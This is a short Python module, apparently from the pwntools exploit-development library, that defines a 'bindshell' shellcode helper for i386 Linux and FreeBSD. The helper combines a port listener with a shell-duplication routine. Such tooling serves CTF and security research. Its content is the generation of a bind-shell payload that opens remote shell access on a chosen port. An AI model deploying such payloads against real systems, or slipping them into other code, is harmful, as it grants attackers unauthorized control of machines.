from pwn.internal.shellcode_helper import *
from listen import listen
from .. import dupsh

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'], network='ipv4')
def bindshell(port):
    """Args: port
    Standard bind shell."""
    return listen(port), dupsh()
